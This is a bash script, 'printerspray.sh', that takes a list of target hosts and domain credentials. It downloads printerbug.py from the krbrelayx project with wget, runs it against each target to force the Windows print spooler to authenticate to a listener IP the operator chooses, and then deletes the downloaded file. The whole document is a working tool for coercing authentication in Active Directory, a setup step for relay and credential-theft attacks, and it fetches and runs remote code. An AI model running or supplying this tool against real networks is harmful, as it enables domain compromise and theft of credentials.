#!/bin/bash

help_screen () {
	printf "\nHELP SCREEN \n\n"
	echo "-t targets.txt "
	echo "-d domain.local"
	echo "-u username"
	echo "-p password"
	echo "-l listener IP"
	printf "\n"
	echo "Example: ./printerspray.sh -t ./spooler.txt -d 'labdomain.local' -u 'ADuser1' -p 'pwd' -l 192.168.1.23"
	
}
	 
if [[ $1 = "-h" ]]; then
	help_screen
	exit 1
fi

while getopts ":t:d:u:p:l:h:" option; do
	case "${option}" in
		t) # targets
			targets=${OPTARG};;
		d) # domain
			domain=${OPTARG};;
		u) # user
			username=${OPTARG};;
		p) # password
			password=${OPTARG} ;;
		l) # listener
			listener=${OPTARG} ;;
		h) # Help
			help_screen
			exit 1;;
	esac
done

wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py


filename=$(cat $targets)
for i in $filename; do
	python3 ./printerbug.py $domain/$username:$password@$i $listener
done

rm printerbug.py
